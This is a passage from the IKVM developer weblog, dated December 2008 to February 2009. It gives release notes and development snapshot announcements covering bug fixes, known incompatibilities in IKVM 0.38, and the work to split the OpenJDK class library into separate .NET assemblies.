<LI>When ikvmc loads a referenced assembly that is the main assembly of a sharedclassloader group, also pre-load the other assemblies in the group.</LI>
<LI>More fixes to deal with the fact that the AssemblyClassLoader &lt;-&gt; Assembly mapping is no longer a one to one relation.</LI>
<LI>Changed AssemblyClassLoader to cache assembly load failures (because the CLR binder also caches failures).</LI>
<LI>Disable String.toCharArray() intrinsic in dynamic mode, because it relies on defining global variables which aren't available in dynamic mode.</LI></UL>
<P>As always with a development snapshot, don't use this in production, but please do try it out and let me know about it. The sources are available in cvs and the binaries here: <A href="http://www.frijters.net/ikvmbin-0.39.3328.zip">ikvmbin-0.39.3328.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/10/2009 08:55:25 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=45fc1818-c8ef-4070-953c-ab7554385145"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=45fc1818-c8ef-4070-953c-ab7554385145">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 05 February 2009</h2></div>
<div class="newsItems"><a name="aee22296f-6c25-4a36-8081-c4b77e78f3c0"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.38 Update 1 RC 1</h3>
	<div class="entryBody">
		<P>A fairly serious (because of its potentially elusive nature) bug was found in 0.38 and I forgot to update the version number of IKVM.OpenJDK.ClassLibrary.dll in the previous release candidate, so here is a new release candidate.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.38.0.4.</LI>
<LI>Fixed bug in PassiveWeakDictionary that caused ghost arrays to lose their type after a while. Thanks to Dawid Weiss for reporting this issue.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.38.0.4.zip">ikvmbin-0.38.0.4.zip</A><BR>Sources (+ binaries): Sources: <A href="http://www.frijters.net/ikvm-0.38.0.4.zip">ikvm-0.38.0.4.zip</A>, <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk6-b12-stripped.zip">openjdk6-b12-stripped.zip</A><BR>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/05/2009 15:51:03 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ee22296f-6c25-4a36-8081-c4b77e78f3c0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ee22296f-6c25-4a36-8081-c4b77e78f3c0">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 02 February 2009</h2></div>
<div class="newsItems"><a name="a7fb048b2-7d35-4036-b53f-8f62b0003a34"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.38 Update 1 RC 0</h3>
	<div class="entryBody">
		<P>Since there isn't yet a schedule for when 0.40 will be available, I decided to release an update of 0.38 that includes recent bug fixes.</P>
<P>Changes:</P>
<UL>
<LI>Changed version to 0.38.0.3.</LI>
<LI>Fixed the stack trace when an unwrapped java.lang.Error (or subclass) escapes from a static initializer.</LI>
<LI>It turns out that we really should create an MBeanServer in sun.management.ManagementFactory.createPlatformMBeanServer(), even if we don't populate it with anything useful, applications might still want to register their own MBeans. This fix allows Derby 10.4.2.0 to work.</LI>
<LI>Added helpful message to ClassCastException generated for ghost array casts.</LI>
<LI>Added check for constructor with missing body in map.xml.</LI>
<LI>Removed over eager state checking from java.util.zip.Deflater. Fixes Lucene issue.</LI>
<LI>Fixed enclosing method discovery to work for ReflectionOnly assemblies. This allows ikvmstub to work with ikvmc generated assemblies.</LI>
<LI>Always emit an explicit method override if we've mangled the name/sig, because we can't predict whether it will be needed or not (without keeping track of the mangling in the base classes) and the cost is minimal since this doesn't happen all that often.</LI>
<LI>Miranda method should use mangled name (if the name is mangled).</LI>
<LI>Fixed pointer detection to work for types with multiple indirection levels.</LI>
<LI>If the last call site of a subroutine wasn't reachable, the return switch would fall through potentially causing the code to be unverifiable.</LI>
<LI>The check for unloadable types on the stack indexed the stack in the wrong order.</LI>
<LI>Fixed exception wrapping for java.security.AccessController.doPrivileged().</LI>
<LI>Fixed tracer to only add a trace listener in executables.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.38.0.3.zip">ikvmbin-0.38.0.3.zip</A><BR>Sources (+ binaries): Sources: <A href="http://www.frijters.net/ikvm-0.38.0.3.zip">ikvm-0.38.0.3.zip</A>, <A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>, <A href="http://www.frijters.net/openjdk6-b12-stripped.zip">openjdk6-b12-stripped.zip</A><BR>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/02/2009 07:01:55 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7fb048b2-7d35-4036-b53f-8f62b0003a34"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7fb048b2-7d35-4036-b53f-8f62b0003a34">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 21 January 2009</h2></div>
<div class="newsItems"><a name="a585a7d7d-172f-4e01-96a7-31e5660fd503"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Volker Berlin continues working on integrating more OpenJDK awt/image related code. He also started on a fully managed JDBC / ODBC bridge implementation (using <A href="http://msdn.microsoft.com/en-us/library/system.data.odbc.aspx">System.Data.Odbc</A>). I did some bug fixes and few small improvements here and there.</P>
<P>Changes:</P>
<UL>
<LI>Fixed the stack trace when an unwrapped java.lang.Error (or subclass) escapes from a static initializer.</LI>
<LI>It turns out that we really should create an MBeanServer in sun.management.ManagementFactory.createPlatformMBeanServer(), even if we don't populate it with anything useful, applications might still want to register their own MBeans. This fix allows Derby 10.4.2.0 to work.</LI>
<LI>Various java.awt.image.BufferedImage improvements.</LI>
<LI>Use CallerID instead of stack walking in java.util.ResourceBundle.</LI>
<LI>Moved java.security.AccessController.doPrivileged() implementation to Java and use CallerID to avoid stack walk.</LI>
<LI>JPEG support added to ImageIO.</LI>
<LI>Switched to using OpenJDK ColorModel code.</LI>
<LI>Use CallerID instead of stack walking in java.sql.DriverManager.</LI>
<LI>Added helpful message to ClassCastException generated for ghost array casts.</LI>
<LI>Convert a Java filename to a .NET filename in NetToolkit.createImage(String).</LI>
<LI>Added workarounds to make IKVM.Reflection.Emit work on Mono (2.2 or higher required).</LI>
<LI>Made <A href="http://msdn.microsoft.com/en-us/library/system.diagnostics.symbolstore.symwriter.aspx">ISymWrapper.dll</A>&nbsp;dependency conditional in build to make IKVM.Reflection.Emit compile on Mono.</LI></UL>
<P>As always with a development snapshot, don't use this in production, but please do try it out and let me know about it. The sources are available in cvs and the binaries here: <A href="http://www.frijters.net/ikvmbin-0.39.3308.zip">ikvmbin-0.39.3308.zip</A><BR>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/21/2009 06:52:54 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=585a7d7d-172f-4e01-96a7-31e5660fd503"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=585a7d7d-172f-4e01-96a7-31e5660fd503">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 29 December 2008</h2></div>
<div class="newsItems"><a name="acf993fab-fb1b-4f05-9948-fcc9fc121a17"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.38 Released</h3>
	<div class="entryBody">
		<P>I've <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">released IKVM 0.38</A> to SourceForge. The binaries are identical to the ones in <A HREF="/PermaLink.aspx?guid=288e2d5f-6568-49bf-a1b7-2a57537dcd2d">release candidate 2</A>.</P>
<P><B>Release Notes</B></P>
<P>This document lists the known issues and incompatibilities.</P>
<P><B>Runtime</B></P>
<UL>
<LI>Code unloading (aka class GC) is not supported. 
<LI>In Java static initializers can deadlock, on .NET some threads can see uninitialized state in cases where deadlock would occur on the JVM. 
<LI>JNI<BR>
<UL>
<LI>Only supported in the default AppDomain. 
<LI>Only the JNICALL calling convention is supported! (On Windows, HotSpot appears to also support the cdecl calling convention). 
<LI>Cannot call string contructors on already existing string instances 
<LI>A few limitations in Invocation API support<BR>
<UL>
<LI>The Invocation API is only supported when running on .NET. 
<LI>JNI_CreateJavaVM: init options "-verbose[:class|:gc|:jni]", "vfprintf", "exit" and "abort" are not implemented. The JDK 1.1 version of JavaVMInitArgs isn't supported. 
<LI>JNI_GetDefaultJavaVMInitArgs not implemented 
<LI>JNI_GetCreatedJavaVMs only returns the JavaVM if the VM was started through JNI or a JNI call that retrieves the JavaVM has already occurred. 
<LI>DestroyJVM is only partially implemented (it waits until there are no more non-daemon Java threads and then returns JNI_ERR). 
<LI>DetachCurrentThread doesn't release monitors held by the thread.</LI></UL>
<LI>Native libraries are never unloaded (because code unloading is not supported).</LI></UL>
<LI>The JVM allows any reference type to be passed where an interface reference is expected (and to store any reference type in an interface reference type field), on IKVM this results in an IncompatibleClassChangeError. 
<LI>monitorenter / monitorexit cannot be used on unitialized this reference. 
<LI>Floating point is not fully spec compliant. 
<LI>A method returning a boolean that returns an integer other than 0 or 1 behaves differently (this also applies to byte/char/short and for method parameters). 
<LI>Synchronized blocks are not async exception safe. 
<LI>Ghost arrays don't throw ArrayStoreException when you store an object that doesn't implement the ghost interface. 
<LI>Class loading is more eager than on the reference VM. 
<LI>Interface implementation methods are never really final (interface can be reimplemented by .NET subclasses). 
<LI>JSR-133 finalization spec change is not fully implemented. The JSR-133 changes dictate that an object should not be finalized unless the Object constructor has run successfully, but this isn't implemented.</LI>
<LI>When a java.lang.Error (or subclass) is thrown in (and escapes) a static initializer, the stack trace might be (partially) lost.</LI></UL>
<P><B>Static Compiler (ikvmc)</B></P>
<UL>
<LI>Some subtle differences with ikvmc compiled code for public members inherited from non-public base classes (so called "access stubs"). Because the access stub lives in a derived class, when accessing a member in a base class, the derived cctor will be run whereas java (and ikvm) only runs the base cctor. 
<LI>Try blocks around base class ctor invocation result in unverifiable code (no known compilers produce this type of code). 
<LI>Try/catch blocks before base class ctor invocation result in unverifiable code (this actually happens with the Eclipse compiler when you pass a class literal to the base class ctor and compile with -target 1.4). 
<LI>Only code compiled in a single assembly fully obeys the JLS binary compatibility rules. 
<LI>An assembly can only contain one resource with a particular name. 
<LI>Passing incorrect command line options to ikvmc may result in an exception rather than a proper error messages.</LI>
<LI>Under specific circumstances ikvmc may die with an exception if you're compiling code that references missing classes. As a workaround, supply the missing classes (may be stubs).</LI>
<LI>Under specific circumstances ikvmc may produce unverifiable code if you're compiling code that references missing classes. As a workaround, supply the missing classes (may be stubs).</LI></UL>
<P><B>Class Library</B></P>
<P>Most class library code is based on OpenJDK 6 build 12. Below is a list of divergences and IKVM specific implementation notes.</P>
<TABLE cellSpacing=0>
<TBODY>
<TR>
<TD style="BORDER-TOP: black 1px solid">com.sun.security.auth.module&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD style="BORDER-TOP: black 1px solid">Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.applet</TD>
<TD>GNU Classpath implementation. Not implemented.</TD></TR>
<TR>
<TD>java.awt</TD>
<TD>GNU Classpath implementation with partial System.Windows.Forms based back-end. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.io.Console</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.lang.instrument</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.lang.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.net</TD>
<TD>No IPv6 support implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.net.ProxySelector</TD>
<TD>Getting the default system proxy for a URL is not implemented.</TD></TR>
<TR>
<TD>java.text.Bidi</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.util.zip</TD>
<TD>Partially based on GNU Classpath implementation.</TD></TR>
<TR>
<TD>javax.imageio.plugins.jpeg</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.print</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.script</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.smartcardio</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.sound</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.swing</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.tools</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>org.ietfs.jgss</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>sun.jdbc.odbc</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>sun.net.www.content.audio</TD>
<TD>Audio content handlers not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD style="BORDER-BOTTOM: black 1px solid">sun.net.www.content.image</TD>
<TD style="BORDER-BOTTOM: black 1px solid">Image content handlers not implemented.</TD></TR></TBODY></TABLE>
<P>The entire public API is available, so "Not implemented." for javax.print, for example, means that the API is there but there is no back-end to provide the actual printing support. "Not supported." means that the code is there and probably works at least somewhat, but that I'm less likely to fix bugs reported in these areas.</P>
<P>Specific API notes:</P>
<UL>
<LI>java.lang.Thread.stop(Throwable t) doesn't support throwing arbitrary exceptions on other threads (only java.lang.ThreadDeath). 
<LI>java.lang.Thread.holdsLock(Object o) causes a spurious notify on the object (this is allowed by the J2SE 5.0 spec). 
<LI>java.lang.String.intern() strings are never garbage collected. 
<LI>Weak/soft references and reference queues are inefficient and do not fully implement the required semantics. 
<LI>java.lang.ref.SoftReference: Soft references are not guaranteed to be cleared before an OutOfMemoryError is thrown. 
<LI>Threads started outside of Java aren't "visible" (e.g. in ThreadGroup.enumerate()) until they first call Thread.currentThread(). 
<LI>java.lang.Thread.getState() returns WAITING or TIMED_WAITING instead of BLOCKING when we're inside Object.wait() and blocking to re-acquire the monitor. 
<LI>java.nio.channel.FileChannel.lock() shared locks are only supported on Windows NT derived operating systems. 
<LI>java.lang.SecurityManager: Deprecated methods not implemented: classDepth(String), inClass(String), classLoaderDepth(), currentLoadedClass(), currentClassLoader(), inClassLoader()</LI></UL>
<P><B>Supported Platforms</B></P>
<P>This release has been tested on the following CLI implementations / platforms:</P>
<TABLE border=0>
<TBODY>
<TR>
<TD><B>CLI Implementation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Architecture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Operating System</B></TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x86</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x64</TD>
<TD>Windows</TD></TR></TBODY></TABLE>
<P><BR><B>Partial Trust</B></P>
<P>There is experimental support for running in partial trust.<BR>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/29/2008 08:46:52 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=cf993fab-fb1b-4f05-9948-fcc9fc121a17"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=cf993fab-fb1b-4f05-9948-fcc9fc121a17">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 24 December 2008</h2></div>
<div class="newsItems"><a name="a885c4705-5032-4f03-be85-0b3fd3c01176"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>I've checked in all the changes required to split the class library into ten different assemblies. So here is the first snapshot that contains the split binaries.</P>
<P>This means that the -sharedclassloader ikvmc option has been implemented, but it isn't ready for prime time yet, for now I've only focussed on getting the core class library to build with it.</P>
<P>Changes:</P>
<UL>
<LI>Split IKVM.OpenJDK.ClassLibrary.dll into ten parts.</LI>
<LI>Added -sharedclassloader option to ikvmc.</LI>
<LI>Removed some GNU Classpath build leftovers.</LI>
<LI>Removed workaround for com.sun.beans.ObjectHandler.classForName2() that hopefully isn't necessary any more.</LI>
<LI>Made ikvmc emit a warning whenever it emits code that throws a hard error.</LI>
<LI>Fixed ikvmc to detect access to members in another assembly that expose non-public types from that assembly (the CLR doesn't allow this) and generate java.lang.IllegalAccessError (plus warning during compilation) instead of producing invalid code.</LI>
<LI>Volker Berlin checked in his first set of changes to replace java.awt.image.BufferedImage with the OpenJDK version.</LI></UL>
<P>As always with a development snapshot, don't use this in production, but please do try it out and let me know about it. The sources are available in cvs and the binaries here: <A href="http://www.frijters.net/ikvmbin-0.39.3280.zip">ikvmbin-0.39.3280.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/24/2008 07:14:18 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=885c4705-5032-4f03-be85-0b3fd3c01176"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=885c4705-5032-4f03-be85-0b3fd3c01176">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 19 December 2008</h2></div>
<div class="newsItems"><a name="af5cd40bc-d6ff-4fa1-8c0b-33a07f7ef967"></a><div class="entry">
	<h3 class="entryTitle">Modularization Status Update</h3>
	<div class="entryBody">
		<P>I've been doing lots of modularization work, but I'm not quite ready to check it in yet. I've now split the class library assembly into ten assemblies and I've got "shared class loader" support working (at least for the core class library scenario).</P>
<P>I've been positively surprised by how many scenarios can be supported while only loading IKVM.OpenJDK.Core.dll. As the graph below shows, it has more (necessarily circular) dependencies than I would like, but for a number of scenarios I've carefully tweaked the set of classes in Core to enable lazy loading the dependencies only when they are really needed.</P>
<P>I'm not yet ready to commit to supported "Core-only" scenarios, but here's a flavor of some things I've been able to do:</P>
<UL>
<LI>Running "Hello, World!" in dynamic mode</LI>
<LI>Serialization</LI>
<LI>Reflection</LI>
<LI>File I/O &amp; Socket I/O (both classic and nio)</LI></UL>
<P>Packages included in Core:</P>
<UL>
<LI>java.io</LI>
<LI>java.lang</LI>
<LI>java.lang.annotation</LI>
<LI>java.lang.ref</LI>
<LI>java.lang.reflection</LI>
<LI>java.math</LI>
<LI>java.net</LI>
<LI>java.nio</LI>
<LI>java.nio.channels</LI>
<LI>java.nio.channels.spi</LI>
<LI>java.nio.charset</LI>
<LI>java.nio.charset.spi</LI>
<LI>java.security</LI>
<LI>java.security.cert</LI>
<LI>java.util</LI>
<LI>java.util.concurrent</LI>
<LI>java.util.concurrent.atomic</LI>
<LI>java.util.concurrent.locks</LI>
<LI>java.util.regex</LI>
<LI>javax.net</LI></UL>
<P>Here is the assembly dependency graph (click the image to enlarge):</P>
<P><A href="http://www.frijters.net/OpenJDK-deps.png"><IMG border=0 src="http://www.frijters.net/OpenJDK-deps-small.png"></A></P>
<P>Here are the current assembly file sizes:</P>
<P>
<TABLE border=0>
<TBODY>
<TR>
<TD>IKVM.OpenJDK.Core.dll</TD>
<TD align=right>3,278,848</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Security.dll</TD>
<TD align=right>2,646,016</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Util.dll</TD>
<TD align=right>1,111,040</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Xml.dll</TD>
<TD align=right>8,497,664</TD></TR>
<TR>
<TD>IKVM.OpenJDK.SwingAWT.dll</TD>
<TD align=right>3,040,768</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Charsets.dll</TD>
<TD align=right>5,017,088</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Corba.dll</TD>
<TD align=right>2,335,232</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Management.dll&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD align=right>1,180,160</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Misc.dll</TD>
<TD align=right>2,668,032</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Text.dll</TD>
<TD align=right>628,736</TD></TR>
<TR>
<TD>&nbsp;</TD>
<TD style="BORDER-BOTTOM: black 3px double; BORDER-TOP: black 1px solid" align=right>30,403,584</TD></TR></TBODY></TABLE></P>
<P>It's interesting to see that the total is slightly less than the previous size of IKVM.OpenJDK.ClassLibrary.dll (30,472,704). </P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/19/2008 08:49:00 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f5cd40bc-d6ff-4fa1-8c0b-33a07f7ef967"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f5cd40bc-d6ff-4fa1-8c0b-33a07f7ef967">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 08 December 2008</h2></div>
<div class="newsItems"><a name="a2ecd5b7e-ae32-413b-8970-fc467d9e3f12"></a><div class="entry">
	<h3 class="entryTitle">Modularizing OpenJDK</h3>
	<div class="entryBody">
		<P>Recently Mark Reinhold <A href="http://blogs.sun.com/mr/entry/big_jdk">started</A> <A href="http://blogs.sun.com/mr/entry/packaging_java_code">blogging about</A> <A href="http://blogs.sun.com/mr/entry/modular_java_platform">modularizing</A> <A href="http://blogs.sun.com/mr/entry/jigsaw">the JDK</A>. I've been getting requests to split up IKVM.OpenJDK.ClassLibrary.dll for a long time. It's good to see that the Java platform is also moving in that direction, but we needn't wait for that.</P>
<P>I've been working on making ikvmc support "<A HREF="/PermaLink.aspx?guid=46dbafeb-4d5a-42ff-a34b-414b8b2361c0">multi target</A>" mode for a while now. Last week I used this mode to compile the OpenJDK classes into 743 different assemblies (one per package) . I then tried to use NDepend to dig through the dependencies, but it turns out that 743 assemblies is a bit too much to handle (NDepend handled it resonably well, but the dependency graph was way too large to be useful). So I started moving some obvious stuff together. The result was this <A href="http://www.frijters.net/NDepend/NDependReport.html">NDepend report</A>. Still a lot of data and a lot of dependencies, but some patterns are starting to emerge.</P>
<P>Here's my preliminary view of how things could be split:</P>
<P>
<TABLE border=0>
<TBODY>
<TR>
<TD>IKVM.OpenJDK.Core.dll</TD>
<TD>5 MB</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Security.dll</TD>
<TD>3 MB</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Util.dll</TD>
<TD>1 MB</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Xml.dll</TD>
<TD>8 MB</TD></TR>
<TR>
<TD>IKVM.OpenJDK.SwingAWT.dll</TD>
<TD>3 MB</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Charsets.dll</TD>
<TD>5 MB</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Corba.dll</TD>
<TD>2 MB</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Management.dll&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD>2 MB</TD></TR>
<TR>
<TD>IKVM.OpenJDK.Misc.dll</TD>
<TD>3 MB</TD></TR></TBODY></TABLE></P>
<P>(The sizes are only approximate.)</P>
<P>I had originally hoped to make IKVM.OpenJDK.Core.dll smaller by keeping java.util, java.net and java.io out of it, but it looks like you won't be able to run anything non-trivial without requiring classes from these packages, so it makes more sense to put them into the core assembly. The IKVM.OpenJDK.Security.dll and&nbsp; IKVM.OpenJDK.Util.dll assemblies contain other util and security related packages that shouldn't be needed as often.</P>
<P>It is possible to split packages across assemblies (e.g. <A href="http://java.sun.com/javase/6/docs/api/java/awt/AWTPermission.html">java.awt.AWTPermission</A> will be in IKVM.OpenJDK.Core.dll because <A href="http://java.sun.com/javase/6/docs/api/java/lang/SecurityManager.html">java.lang.SecurityManager</A> depends on it), but given the potential for confusion my current thinking is that it is probably best to only move individual classes into Core should it be necessary (because, realistically, you can't develop without having a reference to Core you're less likely to be confused when trying to locate the class).</P>
<P>To avoid confusion or expectations that are too high: I haven't yet built the runtime infrastructure to support this. So while I can compile the class library into all these parts, the runtime won't actually be able to work correctly, because it still expects all the boot class loader classes in a single assembly.</P>
<P>As always, feedback on the proposed split is very welcome.</P>
<P><B>NDepend</B></P>
<P>I really like NDepend's ability to show the dependencies in different ways and the interactive dependency matrix that allows you to drill down into a dependency to see exactly where it comes from. Beyond dependency analysis it also has a power SQL like query language to allows use to query dependencies and compute all the code metrics you can come up with. It also includes a number of code metrics out of the box, but those aren't really my cup of tea, so I can't comment how useful they are.</P>
<P>One other small but really nice thing about it is that you can run it without installing. IMO this is very nice compared with installers that do who knows what to your system (and require administrator access).</P>
<P>An evaluation copy can be downloaded from their <A href="http://www.ndepend.com/">website</A>.</P>
<P>Full disclosure: I was given a free copy of NDepend Professional Edition.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/08/2008 06:51:28 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2ecd5b7e-ae32-413b-8970-fc467d9e3f12"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2ecd5b7e-ae32-413b-8970-fc467d9e3f12">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 01 December 2008</h2></div>
<div class="newsItems"><a name="ab10de019-92bc-4ad0-85ed-2789a9d035a6"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>More ikvmc testing revealed a couple of IKVM.Reflection.Emit bugs and also some bugs that have been lurking in ikvmc for a long time, that only show up under fairly uncommon scenarios when lots of dependencies are missing (and hence the resulting assembly has little chance of working anyway). The fixes are small and relatively low risk, but I'm not sure whether it is worthwhile to back port them to 0.36 and 0.38. Feedback on this is appreciated.</P>
<P>Changes:</P>
<UL>
<LI>Added support for SpecialNameAttribute and TypeForwardedToAttribute pseudo custom attributes to IKVM.Reflection.Emit.</LI>
<LI>Fixed IKVM.Reflection.Emit relocation table bug.</LI>
<LI>Fixed IKVM.Reflection.Emit TypeDefOrRef and HasCustomAttribute column size calculations.</LI>
<LI>A couple of ikvmc fixes in dealing with missing classes. This fixes <A href="http://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=2351524&amp;group_id=69637">#2351524</A>.</LI>
<LI>Fixed regression introduced in 0.39.3240 that caused failure when reflection triggered a call to a static initializer on a dynamically loaded class.</LI></UL>
<P>As always with a development snapshot, don't use this in production, but please do try it out and let me know about it. The sources are available in <A href="http://ikvm.cvs.sourceforge.net/viewvc/ikvm/ikvm/">cvs</A> and the binaries here: <A href="http://www.frijters.net/ikvmbin-0.39.3257.zip">ikvmbin-0.39.3257.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/01/2008 07:16:54 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=b10de019-92bc-4ad0-85ed-2789a9d035a6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=b10de019-92bc-4ad0-85ed-2789a9d035a6">Comments [1]</a>
